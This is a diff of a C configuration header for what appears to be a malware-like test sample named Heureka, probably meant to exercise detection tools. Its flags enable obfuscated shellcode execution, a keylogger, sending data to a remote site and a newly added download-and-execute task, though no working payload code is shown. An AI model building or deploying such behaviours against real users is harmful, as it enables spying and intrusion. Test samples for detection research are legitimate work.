@@ -1,7 +1,6 @@
 // compilation setup
 #define SHELLCODE 1				// The binary will contain shellcode
 #define SHELLCODE_XOR 1			// The binary will contain XOR obfuscated shellcode
-#define REMOTE_HOST 1			// The binary will contain reference to a remote host 
 #define ALLOC_RWX_CALL 1		// Task: Allocate memory, write and execute SHELLCODE 
 #define ALLOC_RWX_XOR_CALL 1	// Task: Allocate memory, write and execute XOR obfustcated SHELLCODE 
 #define WRITE_LOG 1				// Task: Write system information to temporary directory
@@ -12,6 +11,7 @@
 #define WEB_SEND_RECV 1			// Task: Send/Receive data to/from a website
 #define HOOK_KEYBOARD 1     // Task: Keylogger
 #define WRITE_HOSTS 0     // Task: Append hosts file
+#define DOWNLOAD_EXEC 1     // Task: Download and execute
 #define IE_PATH "C:\\Program Files\\Internet Explorer\\iexplore.exe"
 #define HEUREKADLL_PATH "Z:\\heureka\\heureka\\Release\\heurekadll.dll"
 
@@ -70,9 +70,14 @@ const unsigned char XOR_key=0x42;
 
 #endif
 
-#if REMOTE_HOST==1
+#if WEB_SEND_RECV==1
 const WCHAR remote_host[]=L"baidu.com";
 const WCHAR remote_resource[]=L"/HeurekaTest";
+#endif
+
+#if DOWNLOAD_EXEC==1
+const WCHAR download_exec_host[]=L"";
+const WCHAR download_exec_resource[]=L"";
 #endif
 
 #if SEARCH_DOCS==1
